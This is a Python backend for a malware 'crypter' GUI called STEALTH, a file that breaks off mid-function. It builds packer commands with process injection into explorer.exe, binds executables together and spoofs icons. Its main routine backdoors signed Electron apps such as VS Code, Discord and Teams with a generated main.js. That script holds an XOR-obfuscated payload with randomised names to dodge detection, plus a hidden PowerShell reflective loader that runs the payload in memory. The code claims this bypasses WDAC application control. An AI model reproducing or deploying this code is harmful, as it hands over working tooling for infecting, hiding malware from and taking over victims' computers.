#!/usr/bin/env python3
"""Backend helpers for the STEALTH PyQt GUI.
- Builds packer commands
- Stages plugins into a temporary folder
- Runs the packer subprocess asynchronously with captured stdout/stderr
"""
import os
import json
import shutil
import subprocess
import threading
import tempfile
import time
from pathlib import Path

# Try PyQt6 then PyQt5 for signals/QObject
try:  # pragma: no cover - runtime import preference
    from PyQt6 import QtCore
    QtSignal = QtCore.pyqtSignal
except Exception:  # pragma: no cover - runtime import preference
    from PyQt5 import QtCore
    QtSignal = QtCore.pyqtSignal


class SubprocessWorker(QtCore.QObject):
    """Runs a subprocess on a Python thread and emits Qt signals for output/finish."""
    line = QtSignal(str)
    finished_rc = QtSignal(int)

    def __init__(self, cmd, env=None, cwd=None, parent=None, stub_swap=None):
        super().__init__(parent)
        self.cmd = cmd
        self.env = env or os.environ.copy()
        self.cwd = cwd
        self._thread = None
        self._stub_swap = stub_swap or None
        self._cleanup_paths = []

    def start(self):
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _run(self):
        rc = -1
        try:
            # swap stub.exe if requested
            if self._stub_swap:
                orig = Path(self._stub_swap['orig'])
                override = Path(self._stub_swap['override'])
                backup = self._stub_swap.get('backup')
                if backup:
                    try:
                        shutil.copy2(orig, backup)
                    except Exception:
                        pass
                try:
                    shutil.copy2(override, orig)
                except Exception:
                    pass
                try:
                    self._cleanup_paths.append(str(override))
                except Exception:
                    pass
            creation_flags = 0
            if hasattr(subprocess, 'CREATE_NO_WINDOW'):
                creation_flags = subprocess.CREATE_NO_WINDOW
            result = subprocess.run(
                self.cmd,
                capture_output=True,
                text=True,
                creationflags=creation_flags,
                env=self.env,
                cwd=self.cwd,
            )
            if result.stdout:
                for ln in result.stdout.splitlines():
                    try:
                        self.line.emit(ln)
                    except Exception:
                        pass
            if result.stderr:
                for ln in result.stderr.splitlines():
                    try:
                        self.line.emit(f"[ERR] {ln}")
                    except Exception:
                        pass
            rc = result.returncode
        except Exception as exc:  # pragma: no cover - defensive
            try:
                self.line.emit(f"[ERR] Worker exception: {exc}")
            except Exception:
                pass
            rc = -1
        finally:
            # restore stub.exe if swapped
            if self._stub_swap:
                orig = Path(self._stub_swap['orig'])
                backup = self._stub_swap.get('backup')
                try:
                    if backup and Path(backup).exists():
                        shutil.copy2(backup, orig)
                        try:
                            Path(backup).unlink()
                        except Exception:
                            pass
                    else:
                        # if no backup, do nothing (leave override)
                        pass
                except Exception:
                    pass
            # cleanup temp files
            for p in self._cleanup_paths:
                try:
                    Path(p).unlink()
                except Exception:
                    pass
            try:
                self.finished_rc.emit(rc)
            except Exception:
                pass


class Backend(QtCore.QObject):
    line = QtSignal(str)
    finished_rc = QtSignal(int)

    def __init__(self, parent=None):
        super().__init__(parent)
        self._worker = None
        self._root = Path(__file__).resolve().parent.parent
        self._bin = self._root / 'bin'
        self._rcedit_primary = self._bin / 'rcedit-x64.exe'
        self._rcedit_fallback = self._root / 'rcedit-x64.exe'

    def build_command(self, payload_path, output_path, key_text, junk_mb, load_in_memory, inject_target='explorer.exe', log_fn=None, warn_fn=None):
        payload = Path(payload_path or '')
        output = Path(output_path or '')
        if not payload.exists() or not payload.is_file():
            raise ValueError('Payload path invalid or missing')
        if not output.parent.exists():
            output.parent.mkdir(parents=True, exist_ok=True)
        key = (key_text or '').strip()
        generated = False
        if not key:
            key = os.urandom(32).hex()
            generated = True
            if log_fn:
                log_fn(f"Generated random key: {key}")
        junk_mb = str(int(junk_mb))
        persistence = '0'
        load_in_mem_flag = '1' if load_in_memory else '0'
        cryptor = self._bin / 'stealth_cryptor.exe'
        if not cryptor.exists() and warn_fn:
            warn_fn(f'`{cryptor}` not found; build it first (bin/).')
        # Pass inject_target as 7th arg
        cmd = [str(cryptor), str(payload), str(output), key, junk_mb, persistence, load_in_mem_flag, inject_target or 'explorer.exe']
        return cmd, key, generated

    def build_binder_command(self, exe1, exe2, output_path, name1=None, name2=None, icon_path=None, warn_fn=None):
        exe1 = Path(exe1 or '')
        exe2 = Path(exe2 or '')
        out = Path(output_path or '')
        if not exe1.exists():
            raise ValueError('Primary executable (exe1) missing')
        if not exe2.exists():
            raise ValueError('Secondary executable (exe2) missing')
        if not out.parent.exists():
            out.parent.mkdir(parents=True, exist_ok=True)
        binder = self._bin / 'binder.exe'
        if not binder.exists() and warn_fn:
            warn_fn(f'`{binder}` not found; build it first (bin/).')
        n1 = name1 or exe1.name
        n2 = name2 or exe2.name
        icon = icon_path or ''
        return [str(binder), str(exe1), str(exe2), str(out), n1, n2, icon]

    def stage_plugins(self, plugin_entries, log_fn=None, warn_fn=None):
        """Stage plugin DLLs into a temporary folder; returns (temp_dir, copied_paths)."""
        if not plugin_entries:
            if log_fn:
                log_fn("No plugin entries provided to stage_plugins")
            return None, []
        if log_fn:
            log_fn(f"Staging {len(plugin_entries)} plugin(s)...")
        # Use project root for temp folder to ensure it's accessible from bin/
        cwd = self._root  # Changed from Path.cwd() to ensure correct location
        import time, random
        rnd = random.randint(1000, 9999)
        plugins_dir = cwd / f'plugins_gui_{int(time.time())}_{rnd}'
        copied = []
        try:
            plugins_dir.mkdir(parents=True, exist_ok=False)
            if log_fn:
                log_fn(f"Created temp folder: {plugins_dir}")
        except Exception as e:
            if warn_fn:
                warn_fn(f"Could not create temporary plugins folder: {e}")
            return None, copied
        for entry in plugin_entries:
            src = Path(entry.get('path') or '')
            if log_fn:
                log_fn(f"  Checking plugin: {src}")
            if not src.exists():
                if warn_fn:
                    warn_fn(f"Plugin not found: {src}")
                continue
            dest = plugins_dir / src.name
            try:
                shutil.copy2(str(src), str(dest))
                copied.append(str(dest))
                if log_fn:
                    log_fn(f"  Copied: {src.name} -> {dest}")
                stage = int(entry.get('stage', 0))
                order = int(entry.get('order', 0))
                meta_path = plugins_dir / (src.name + '.meta')
                with open(meta_path, 'w', encoding='utf-8') as mf:
                    mf.write(f"stage={stage}\n")
                    mf.write(f"order={order}\n")
                copied.append(str(meta_path))
                if log_fn:
                    log_fn(f"  Meta: stage={stage}, order={order}")
            except Exception as e:
                if warn_fn:
                    warn_fn(f"Failed to copy plugin {src} -> {dest}: {e}")
        if copied and log_fn:
            log_fn(f"Staged {len(copied)//2} plugin(s) into: {plugins_dir}")
        return str(plugins_dir), copied

    def cleanup_plugins(self, temp_dir):
        if not temp_dir:
            return
        try:
            shutil.rmtree(temp_dir)
        except Exception:
            pass

    def start_process(self, cmd, plugin_dir=None, disable_plugins_default=False, workdir=None, icon_stub_override=None, inject_target=None):
        env = os.environ.copy()
        if plugin_dir:
            env['PLUGIN_DIR'] = plugin_dir
        else:
            env.pop('PLUGIN_DIR', None)  # ensure stale value is cleared
            if disable_plugins_default:
                env['PLUGIN_DIR_DISABLE'] = "1"
        # Set injection target for remote process injection plugins
        if inject_target:
            env['STEALTH_INJECT_TARGET'] = inject_target
        stub_swap = None
        if icon_stub_override:
            try:
                orig = Path(workdir or self._bin) / 'stub.exe'
                backup = orig.with_name('stub_backup_auto.exe') if orig.exists() else None
                stub_swap = {'orig': str(orig), 'override': str(icon_stub_override), 'backup': str(backup) if backup else None}
            except Exception:
                stub_swap = None
        worker = SubprocessWorker(cmd, env=env, cwd=workdir, stub_swap=stub_swap)
        worker.line.connect(self.line)
        worker.finished_rc.connect(self.finished_rc)
        worker.start()
        self._worker = worker
        return worker

    def prepare_iconized_stub(self, icon_path, log_fn=None, warn_fn=None):
        stub = self._bin / 'stub.exe'
        if not stub.exists():
            if warn_fn:
                warn_fn(f"stub.exe not found at {stub}; cannot apply icon")
            return None
        tmp_fd, tmp_path = tempfile.mkstemp(prefix="stub_iconized_", suffix=".exe")
        os.close(tmp_fd)
        tmp = Path(tmp_path)
        try:
            shutil.copy2(stub, tmp)
            ok = self.apply_icon(tmp, icon_path, log_fn=log_fn, warn_fn=warn_fn)
            if ok:
                return str(tmp)
        except Exception as exc:
            if warn_fn:
                warn_fn(f"Icon prep failed: {exc}")
        try:
            if tmp.exists():
                tmp.unlink()
        except Exception:
            pass
        return None

    def apply_icon(self, exe_path, icon_path, log_fn=None, warn_fn=None):
        exe = Path(exe_path or '')
        icon = Path(icon_path or '')
        if not exe.exists():
            if warn_fn:
                warn_fn(f"Icon apply skipped; target missing: {exe}")
            return False
        if not icon.exists():
            if warn_fn:
                warn_fn(f"Icon apply skipped; icon missing: {icon}")
            return False
        # Basic ICO header validation; if invalid, attempt conversion via Pillow
        try:
            with open(icon, 'rb') as fh:
                hdr = fh.read(4)
            if hdr != b'\x00\x00\x01\x00':
                if log_fn:
                    log_fn("Icon is not a valid ICO; attempting conversion to .ico")
                converted = self.convert_to_ico(icon, output_base=exe, log_fn=log_fn, warn_fn=warn_fn)
                if converted and Path(converted).exists():
                    icon = Path(converted)
                else:
                    if warn_fn:
                        warn_fn("Icon conversion failed; skipping icon patch")
                    return False
        except Exception:
            pass
        rcedit_path = None
        if self._rcedit_primary.exists():
            rcedit_path = self._rcedit_primary
        elif self._rcedit_fallback.exists():
            rcedit_path = self._rcedit_fallback
        if not rcedit_path:
            if warn_fn:
                warn_fn(f"rcedit not found at {self._rcedit_primary} or {self._rcedit_fallback}; skipping icon patch")
            return False
        cmd = [str(rcedit_path), str(exe), '--set-icon', str(icon)]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                msg = result.stderr.strip() or f"rcedit failed with code {result.returncode}"
                if warn_fn:
                    warn_fn(f"Icon patch failed: {msg}")
                return False
            if log_fn:
                chosen = str(rcedit_path)
                log_fn(f"Applied icon to {exe.name} using {icon.name} (rcedit: {chosen})")
            return True
        except Exception as exc:  # pragma: no cover - defensive
            if warn_fn:
                warn_fn(f"Icon apply failed: {exc}")
            return False

    def convert_to_ico(self, image_path, output_base=None, log_fn=None, warn_fn=None):
        try:
            from PIL import Image
        except Exception:
            if warn_fn:
                warn_fn("Pillow not installed; cannot convert icon to .ico. Install pillow or choose a .ico file.")
            return None
        src = Path(image_path)
        if not src.exists():
            if warn_fn:
                warn_fn(f"Icon conversion skipped; file missing: {src}")
            return None
        try:
            img = Image.open(src).convert("RGBA")
            target_size = 256
            img = img.resize((target_size, target_size))
            base = Path(output_base) if output_base else src.with_suffix('')
            temp_ico = base.with_suffix('.ico')
            img.save(temp_ico, format='ICO')
            if log_fn:
                log_fn(f"Converted icon to ICO: {temp_ico}")
            return temp_ico
        except Exception as exc:
            if warn_fn:
                warn_fn(f"Icon conversion failed: {exc}")
            return None

    def _validate_electron_target(self, target_path, log_fn=None, warn_fn=None):
        """
        Validate if target is actually an Electron app.
        Returns (is_valid, is_single_exe, error_message)
        """
        target = Path(target_path)
        
        if not target.exists():
            return False, False, f"Path does not exist: {target}"
        
        # Check if it's a folder-based Electron app
        if target.is_dir():
            # Look for typical Electron structure
            resources_dir = target / 'resources'
            if not resources_dir.exists():
                return False, False, "Not an Electron app: missing 'resources' folder"
            
            app_dir = resources_dir / 'app'
            app_asar = resources_dir / 'app.asar'
            
            if not app_dir.exists() and not app_asar.exists():
                return False, False, "Not an Electron app: missing 'resources/app' or 'resources/app.asar'"
            
            # Look for Electron executable
            possible_exes = ['Code.exe', 'electron.exe', 'Discord.exe', 'Teams.exe', 'Slack.exe']
            has_exe = any((target / exe).exists() for exe in possible_exes)
            
            if not has_exe:
                # Look for any .exe in root
                exes = list(target.glob('*.exe'))
                if not exes:
                    return False, False, "Not an Electron app: no executable found"
            
            return True, False, None
        
        # Check if it's a single-file Electron EXE
        elif target.is_file() and target.suffix.lower() == '.exe':
            # Quick heuristic: Electron EXEs are typically large (> 50 MB)
            size_mb = target.stat().st_size / (1024 * 1024)
            
            if size_mb < 20:
                return False, True, f"EXE too small ({size_mb:.1f} MB) - likely not an Electron app (typical: 50-200 MB)"
            
            # Try to detect Electron markers in the EXE
            try:
                with open(target, 'rb') as f:
                    # Read first 10 MB to search for Electron markers
                    data = f.read(10 * 1024 * 1024)
                    
                    # Look for Electron-specific strings
                    electron_markers = [
                        b'Electron',
                        b'Chrome/',
                        b'app.asar',
                        b'electron.asar',
                        b'default_app.asar'
                    ]
                    
                    found_markers = sum(1 for marker in electron_markers if marker in data)
                    
                    # Many Electron apps compress/pack resources, making markers harder to find
                    # If the EXE is large enough (100+ MB), accept it even with no markers
                    if found_markers == 0 and size_mb < 100:
                        return False, True, f"EXE does not appear to be an Electron app (found {found_markers}/5 markers, size: {size_mb:.1f} MB)"
            except Exception as e:
                return False, True, f"Could not read EXE: {e}"
            
            return True, True, None
        else:
            return False, False, "Target must be an Electron app folder or .exe file"
    
    def tamper_electron_app(self, electron_base_path, stub_path, output_path, silent_mode=True, log_fn=None, warn_fn=None):
        """
        Tamper signed Electron app with backdoored main.js containing reflective loader.
        
        Args:
            electron_base_path: Path to Electron folder OR single-file EXE
            stub_path: Path to packed stub
            output_path: Path for tampered output
            silent_mode: If True, kills Electron immediately (no window/UI, pure stealth)
            log_fn: Optional logging function
            warn_fn: Optional warning function
        
        Returns (success, tampered_exe_path)
        """
        import base64
        import struct
        
        electron_base = Path(electron_base_path)
        stub = Path(stub_path)
        output = Path(output_path)
        
        if not electron_base.exists():
            if warn_fn:
                warn_fn(f"Electron base folder not found: {electron_base}")
            return False, None
        
        if not stub.exists():
            if warn_fn:
                warn_fn(f"Stub not found: {stub}")
            return False, None
        
        # Validate Electron target first
        is_valid, is_single_exe, error_msg = self._validate_electron_target(electron_base, log_fn, warn_fn)
        if not is_valid:
            if warn_fn:
                warn_fn(f"Invalid Electron target: {error_msg}")
                warn_fn("Please select:")
                warn_fn("  - Folder: VS Code portable, Discord, Teams, Slack (contains 'resources' folder)")
                warn_fn("  - Single EXE: WinDbgX.exe, Teams portable (large Electron-based EXE, 50+ MB)")
            return False, None
        
        if log_fn:
            log_fn("=== ELECTRON APP TAMPERING ===")
            log_fn(f"Base: {electron_base}")
            log_fn(f"Stub: {stub} ({stub.stat().st_size} bytes)")
            log_fn(f"Output: {output}")
            if is_single_exe:
                log_fn(f"Mode: Single-file Electron EXE")
            else:
                log_fn(f"Mode: Folder-based Electron app")
        
        # Read and encode stub
        if log_fn:
            log_fn("[1/5] Encoding stub to base64...")
        try:
            with open(stub, 'rb') as f:
                stub_bytes = f.read()
            stub_base64 = base64.b64encode(stub_bytes).decode('ascii')
            if log_fn:
                log_fn(f"[+] Stub: {len(stub_bytes)} bytes -> {len(stub_base64)} base64")
        except Exception as e:
            if warn_fn:
                warn_fn(f"Failed to read stub: {e}")
            return False, None
        
        # Use validated detection result
        if is_single_exe:
            # Single-file Electron app (e.g., WinDbgX.exe)
            if log_fn:
                log_fn(f"[2/5] Detected single-file Electron EXE: {electron_base.name}")
                log_fn("[+] Will extract resources and inject main.js")
            
            # Extract app.asar from single EXE
            app_asar_data = self._extract_asar_from_exe(electron_base, log_fn, warn_fn)
            if not app_asar_data:
                if warn_fn:
                    warn_fn("Failed to extract app.asar from single EXE")
                return False, None
            
            # Unpack asar to temp
            temp_asar = self._bin.parent / f'temp_extracted_{int(time.time())}.asar'
            try:
                with open(temp_asar, 'wb') as f:
                    f.write(app_asar_data)
                
                temp_app = self._bin.parent / f'electron_app_{int(time.time())}'
                self._unpack_asar(temp_asar, temp_app, log_fn, warn_fn)
                
                if log_fn:
                    log_fn(f"[+] Extracted app folder: {temp_app}")
            except Exception as e:
                if warn_fn:
                    warn_fn(f"Failed to unpack asar: {e}")
                return False, None
            finally:
                try:
                    if temp_asar.exists():
                        temp_asar.unlink()
                except Exception:
                    pass
        else:
            # Folder-based Electron (e.g., bin/vscode_base/)
            app_dir = electron_base / 'resources' / 'app'
            app_asar = electron_base / 'resources' / 'app.asar'
            
            # Check if using ASAR or unpacked folder
            if app_asar.exists() and app_asar.is_file():
                # VS Code uses app.asar - need to extract it
                if log_fn:
                    log_fn(f"[2/5] Found app.asar: {app_asar}")
                    log_fn("[+] Extracting ASAR to modify main.js...")
                
                # Unpack asar to temp
                temp_app = self._bin.parent / f'electron_app_{int(time.time())}'
                try:
                    self._unpack_asar(app_asar, temp_app, log_fn, warn_fn)
                    if log_fn:
                        log_fn(f"[+] Extracted app folder: {temp_app}")
                except Exception as e:
                    if warn_fn:
                        warn_fn(f"Failed to unpack asar: {e}")
                    return False, None
            elif app_dir.exists() and app_dir.is_dir():
                # Unpacked app folder exists
                if log_fn:
                    log_fn(f"[2/5] Found app folder: {app_dir}")
                
                # Copy to temp
                temp_app = self._bin.parent / f'electron_app_{int(time.time())}'
                try:
                    shutil.copytree(app_dir, temp_app)
                except Exception as e:
                    if warn_fn:
                        warn_fn(f"Failed to copy app folder: {e}")
                    return False, None
            else:
                if warn_fn:
                    warn_fn(f"App folder or app.asar not found in: {electron_base / 'resources'}")
                return False, None
        
        # Generate backdoored main.js
        if log_fn:
            log_fn("[3/5] Generating backdoored main.js...")
        
        backdoored_js = self._generate_backdoored_mainjs(stub_base64, silent_mode=silent_mode)
        
        # Write backdoored main.js to temp_app (already created above)
        main_js = temp_app / 'main.js'
        try:
            with open(main_js, 'w', encoding='utf-8') as f:
                f.write(backdoored_js)
            if log_fn:
                log_fn(f"[+] Wrote backdoored main.js ({len(backdoored_js)} bytes)")
        except Exception as e:
            if warn_fn:
                warn_fn(f"Failed to write main.js: {e}")
            return False, None
        
        # Create tampered copy of entire Electron structure
        if log_fn:
            log_fn("[4/5] Creating tampered Electron copy...")
        
        temp_electron = self._bin.parent / f'tampered_electron_{int(time.time())}'
        try:
            if temp_electron.exists():
                shutil.rmtree(temp_electron)
            
            if is_single_exe:
                # For single-EXE, we extract the full Electron app folder structure
                # Copy original EXE as base
                temp_electron.mkdir(parents=True, exist_ok=True)
                shutil.copy2(electron_base, temp_electron / electron_base.name)
                
                # Create resources/app folder structure
                resources_dir = temp_electron / 'resources'
                resources_dir.mkdir(exist_ok=True)
                tampered_app_dir = resources_dir / 'app'
                shutil.copytree(temp_app, tampered_app_dir)
                
                if log_fn:
                    log_fn(f"[+] Created folder structure from single-EXE")
            else:
                # For folder-based, copy entire structure
                shutil.copytree(electron_base, temp_electron)
                
                # Replace app folder
                tampered_app_dir = temp_electron / 'resources' / 'app'
                if tampered_app_dir.exists():
                    shutil.rmtree(tampered_app_dir)
                shutil.copytree(temp_app, tampered_app_dir)
            
            if log_fn:
                log_fn(f"[+] Replaced app folder in: {temp_electron}")
        except Exception as e:
            if warn_fn:
                warn_fn(f"Failed to create tampered Electron: {e}")
            return False, None
        finally:
            # Clean up temp app
            try:
                if temp_app.exists():
                    shutil.rmtree(temp_app)
            except Exception:
                pass
        
        # Copy entire folder structure to output location
        if log_fn:
            log_fn("[5/5] Copying tampered Electron app to output...")
        
        # Find main EXE (Code.exe for VS Code, or original name for single-EXE)
        if is_single_exe:
            main_exe_name = electron_base.name
        else:
            main_exe_name = 'Code.exe'
        
        main_exe = temp_electron / main_exe_name
        if not main_exe.exists():
            if warn_fn:
                warn_fn(f"{main_exe_name} not found in: {temp_electron}")
            return False, None
        
        try:
            # Create output directory structure
            output_dir = output.parent / output.stem
            if output_dir.exists():
                shutil.rmtree(output_dir)
            output_dir.mkdir(parents=True, exist_ok=True)
            
            if log_fn:
                log_fn(f"[+] Copying entire Electron folder structure...")
            
            # Copy all files from temp_electron to output_dir
            for item in temp_electron.iterdir():
                if item.is_dir():
                    shutil.copytree(item, output_dir / item.name, dirs_exist_ok=True)
                else:
                    shutil.copy2(item, output_dir / item.name)
            
            # Rename main EXE to user's specified name
            final_exe = output_dir / main_exe_name
            if final_exe.exists():
                final_exe.rename(output_dir / output.name)
            
            if log_fn:
                log_fn(f"[+] Created: {output_dir / output.name} ({(output_dir / output.name).stat().st_size} bytes)")
                log_fn("=== TAMPERING COMPLETE ===")
                log_fn(f"[*] Signature: Original MS signature intact")
                log_fn(f"[*] WDAC: Should bypass (signed outer EXE)")
                log_fn(f"[*] Deploy folder: {output_dir}")
                log_fn(f"[*] Main EXE: {output.name}")
                log_fn(f"[!] IMPORTANT: Deploy entire '{output_dir.name}' folder, not just the EXE!")
            return True, str(output_dir / output.name)
        except Exception as e:
            if warn_fn:
                warn_fn(f"Failed to copy output: {e}")
            return False, None
    
    def _generate_backdoored_mainjs(self, stub_base64, silent_mode=True):
        """Generate main.js with embedded PowerShell reflective loader
        
        Args:
            stub_base64: Base64-encoded stub bytes
            silent_mode: If True, kills Electron immediately (no window/UI)
        """
        import random
        import string
        
        # Generate random variable names to avoid signature detection
        def rand_var():
            return ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
        
        v_app = rand_var()
        v_spawn = rand_var()
        v_fs = rand_var()
        v_path = rand_var()
        v_os = rand_var()
        v_data = rand_var()
        v_exec = rand_var()
        v_bytes = rand_var()
        v_tmp = rand_var()
        v_loader = rand_var()
        
        # XOR encode the base64 to avoid static detection
        key = random.randint(1, 255)
        encoded_chunks = []
        chunk_size = 80000
        
        for i in range(0, len(stub_base64), chunk_size):
            chunk = stub_base64[i:i+chunk_size]
            # XOR encode each character and keep as string
            # Use JSON-safe escaping for special chars
            encoded_chars = []
            for c in chunk:
                xor_val = ord(c) ^ key
                # Keep printable ASCII as-is, escape others
                if 32 <= xor_val <= 126 and xor_val not in [34, 39, 92]:  # not quote or backslash
                    encoded_chars.append(chr(xor_val))
                else:
                    # Use Unicode escape for safety
                    encoded_chars.append(f'\\u{xor_val:04x}')
            encoded = ''.join(encoded_chars)
            encoded_chunks.append(f'"{encoded}"')
        
        chunks_js = ' +\n    '.join(encoded_chunks)
        
        # Silent mode: kill Electron immediately, no UI/window
        if silent_mode:
            template = f'''// Application initialization
const {{{v_app}}} = require('electron');
const {{{v_spawn}}} = require('child_process');
const {v_fs} = require('fs');
const {v_path} = require('path');
const {v_os} = require('os');

// Configuration data
const {v_data} = {chunks_js};

// Prevent ALL windows BEFORE ready
{v_app}.on('browser-window-created', (e, w) => {{
    e.preventDefault();
    w.destroy();
}});

// Decode and execute
function {v_exec}() {{
    const k = {key};
    let d = '';
    for (let i = 0; i < {v_data}.length; i++) {{
        d += String.fromCharCode({v_data}.charCodeAt(i) ^ k);
    }}
    const {v_bytes} = Buffer.from(d, 'base64');
    const {v_tmp} = {v_path}.join({v_os}.tmpdir(), `u_${{Date.now()}}.dat`);
    
    {v_fs}.writeFileSync({v_tmp}, {v_bytes});
    
    const {v_loader} = `$e='SilentlyContinue';$ErrorActionPreference=$e;$p='${{({v_tmp}).replace(/\\\\/g, '\\\\\\\\')}}';$b=[IO.File]::ReadAllBytes($p);try{{Remove-Item $p -Force}}catch{{}};Add-Type -T @"using System;using System.Runtime.InteropServices;public class L{{[DllImport(\\"kernel32\\")]public static extern IntPtr V(IntPtr a,IntPtr s,int t,int p);[DllImport(\\"kernel32\\")]public static extern IntPtr C(IntPtr h,IntPtr a,uint s,int p,ref int w);[DllImport(\\"kernel32\\")]public static extern bool W(IntPtr h,int t);public static void E(byte[] d){{IntPtr m=V(IntPtr.Zero,(IntPtr)d.Length,0x3000,0x40);Marshal.Copy(d,0,m,d.Length);int o=Marshal.ReadInt32(m,0x3c);int e=Marshal.ReadInt32(m,o+0x28);IntPtr ep=new IntPtr(m.ToInt64()+e);IntPtr t=C(IntPtr.Zero,IntPtr.Zero,0,0x04000000,ref o);W(t,ep.ToInt32());}}}}";@;[L]::E($b);`;
    
    {v_spawn}('powershell', ['-w','hidden','-nop','-nol','-c',{v_loader}], {{
        windowsHide: true,
        stdio: 'ignore',
        detached: true
    }}).unref();
}}

{v_app}.on('ready', () => {{
    {v_exec}();
    setTimeout(() => process.exit(0), 150);
}});
'''
        else:
            # Original mode with visible window (for testing/debugging)
            # Reuse the same XOR-encoded data from above
            template = f'''// Electron App - Tampered by STEALTH Crypter
const {{ {v_app} }} = require('electron');
const {{ spawn: {v_spawn} }} = require('child_process');
const {v_fs} = require('fs');
const {v_path} = require('path');
const {v_os} = require('os');

// Obfuscated stub data (XOR encoded)
const {v_data} = {chunks_js};
const k = {key};

// Decode function
let d = "";
for(let i = 0; i < {v_data}.length; i++) {{
    d += String.fromCharCode({v_data}.charCodeAt(i) ^ k);
}}

// Write and execute
function {v_exec}() {{
    try {{
        const b = Buffer.from(d, 'base64');
        const t = {v_path}.join({v_os}.tmpdir(), `u_${{Date.now()}}.dat`);
        
        {v_fs}.writeFileSync(t, b);
        
        // Minified PowerShell loader
        const p = `$e='SilentlyContinue';$ErrorActionPreference=$e;$s='${{t.replace(/\\\\/g, '\\\\\\\\')}}';$b=[IO.File]::ReadAllBytes($s);try{{Remove-Item $s -Force}}catch{{}};Add-Type -T @"using System;using System.Runtime.InteropServices;public class L{{[DllImport(\\"kernel32\\")]public static extern IntPtr V(IntPtr a,uint s,uint t,uint p);[DllImport(\\"kernel32\\")]public static extern bool P(IntPtr a,uint s,uint n,out uint o);[DllImport(\\"kernel32\\")]public static extern IntPtr C(IntPtr a,uint s,IntPtr t,IntPtr p,uint f,IntPtr i);[DllImport(\\"kernel32\\")]public static extern uint W(IntPtr h,uint m);public static void E(byte[] d){{int e=BitConverter.ToInt32(d,0x3C);int si=BitConverter.ToInt32(d,e+0x50);int ep=BitConverter.ToInt32(d,e+0x28);int ns=BitConverter.ToInt16(d,e+0x06);int sh=BitConverter.ToInt32(d,e+0x54);IntPtr ba=V(IntPtr.Zero,(uint)si,0x3000,0x04);if(ba==IntPtr.Zero)return;Marshal.Copy(d,0,ba,sh);int so=e+0xF8;for(int i=0;i<ns;i++){{int o=so+(i*40);int va=BitConverter.ToInt32(d,o+12);int sr=BitConverter.ToInt32(d,o+16);int pr=BitConverter.ToInt32(d,o+20);if(sr>0&&pr>0){{IntPtr sa=new IntPtr(ba.ToInt64()+va);Marshal.Copy(d,pr,sa,Math.Min(sr,d.Length-pr));}}}}uint op;P(ba,(uint)si,0x40,out op);IntPtr en=new IntPtr(ba.ToInt64()+ep);IntPtr ht=C(IntPtr.Zero,0,en,IntPtr.Zero,0,IntPtr.Zero);if(ht!=IntPtr.Zero){{W(ht,3000);}}}}}}";@;[L]::E($b);`;
        
        {v_spawn}('powershell.exe', ['-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-NoProfile','-Command',p], {{
            detached: true,
            stdio: 'ignore',
            windowsHide: true
        }}).unref();
    }} catch(e) {{}}
}}

{v_app}.on('ready', () => {{
    setTimeout({v_exec}, 800);
    setTimeout(() => {v_app}.quit(), 2500);
}});

{v_app}.on('window-all-closed', () => {{
    {v_app}.quit();
}});
'''
        return template
    
    def _extract_asar_from_exe(self, exe_path, log_fn=None, warn_fn=None):
        """Extract app.asar from single-file Electron EXE"""
        try:
            with open(exe_path, 'rb') as f:
                data = f.read()
            
            # Search for ASAR magic: 4 bytes header size, then JSON header
            # ASAR format: [4 bytes size][4 bytes padding][JSON header][files]
            asar_magic = b'\x00\x00\x00'  # Common ASAR pattern
            
            # Search for app.asar marker or ASAR header
            markers = [b'app.asar', b'{"files":', b'ASAR']
            
            for marker in markers:
                idx = data.find(marker)
                if idx > 0:
                    # Try to extract ASAR starting before the marker
                    # ASAR files are typically aligned
                    search_start = max(0, idx - 10000)
                    search_end = min(len(data), idx + 50000000)  # 50 MB search window
                    
                    # Look for ASAR header pattern
                    for i in range(search_start, min(search_start + 10000, search_end), 4):
                        try:
                            # Try to read header size
                            if i + 8 < len(data):
                                header_size = int.from_bytes(data[i:i+4], 'little')
                                if 100 < header_size < 1000000:  # Reasonable header size
                                    # Try to parse as JSON
                                    header_end = i + 8 + header_size
                                    if header_end < len(data):
                                        try:
                                            import json
                                            header_json = data[i+8:header_end].decode('utf-8')
                                            header = json.loads(header_json)
                                            if 'files' in header:
                                                # Found valid ASAR!
                                                # Extract entire ASAR archive
                                                # Calculate total size
                                                max_offset = 0
                                                max_size = 0
                                                
                                                def find_max_offset(files_dict):
                                                    nonlocal max_offset, max_size
                                                    for name, info in files_dict.items():
                                                        if 'files' in info:
                                                            find_max_offset(info['files'])
                                                        elif 'offset' in info and 'size' in info:
                                                            offset = int(info['offset'])
                                                            size = int(info['size'])
                                                            if offset + size > max_offset + max_size:
                                                                max_offset = offset
                                                                max_size = size
                                                
                                                find_max_offset(header['files'])
                                                
                                                total_size = header_end + max_offset + max_size - i
                                                asar_data = data[i:i+total_size]
                                                
                                                if log_fn:
                                                    log_fn(f"[+] Extracted app.asar ({len(asar_data)} bytes)")
                                                return asar_data
                                        except Exception:
                                            continue
                        except Exception:
                            continue
            
            if warn_fn:
                warn_fn("Could not find app.asar in EXE")
            return None
        except Exception as e:
            if warn_fn:
                warn_fn(f"ASAR extraction failed: {e}")
            return None
    
    def _unpack_asar(self, asar_path, output_dir, log_fn=None, warn_fn=None):
        """Unpack ASAR archive to directory"""
        import json
        import struct
        
        try:
            with open(asar_path, 'rb') as f:
                # Read ASAR header
                header_size = struct.unpack('<I', f.read(4))[0]
                f.read(4)  # Skip padding
                header_json = f.read(header_size - 8).decode('utf-8')
                header = json.loads(header_json)
                data_offset = f.tell()
                
                # Extract files recursively
                def extract_files(files_dict, base_path):
                    for name, info in files_dict.items():
                        target = base_path / name
                        if 'files' in info:  # Directory
                            target.mkdir(parents=True, exist_ok=True)
                            extract_files(info['files'], target)
                        else:  # File
                            offset = int(info['offset'])
                            size = int(info['size'])
                            current_pos = f.tell()
                            f.seek(data_offset + offset)
                            file_data = f.read(size)
                            f.seek(current_pos)
                            
                            target.parent.mkdir(parents=True, exist_ok=True)
                            with open(target, 'wb') as out:
                                out.write(file_data)
                
                output_dir.mkdir(parents=True, exist_ok=True)
                extract_files(header['files'], output_dir)
                
                if log_fn:
                    log_fn(f"[+] Unpacked ASAR to {output_dir}")
                return True
        except Exception as e:
            if warn_fn:
                warn_fn(f"ASAR unpack failed: {e}")
            return False
    
    def _repack_asar(self, source_dir, output_asar, log_fn=None, warn_fn=None):
        """Repack directory to ASAR archive"""
        import json
        import struct
        
        try:
            files_dict = {}
